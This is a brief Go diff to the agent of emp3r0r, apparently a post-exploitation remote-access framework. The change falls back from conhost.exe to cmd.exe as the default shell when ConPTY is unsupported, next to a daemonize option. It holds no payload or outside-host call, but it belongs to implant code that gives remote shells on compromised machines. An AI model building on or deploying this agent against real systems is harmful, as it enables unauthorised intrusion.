@@ -74,6 +74,10 @@ func main() {
 	}
 
 	emp3r0r_data.DefaultShell = "conhost.exe"
+	if !agent.IsConPTYSupported() {
+		log.Print("ConPTY not supported")
+		emp3r0r_data.DefaultShell = "cmd.exe"
+	}
 
 	// daemonize
 	if *daemon {
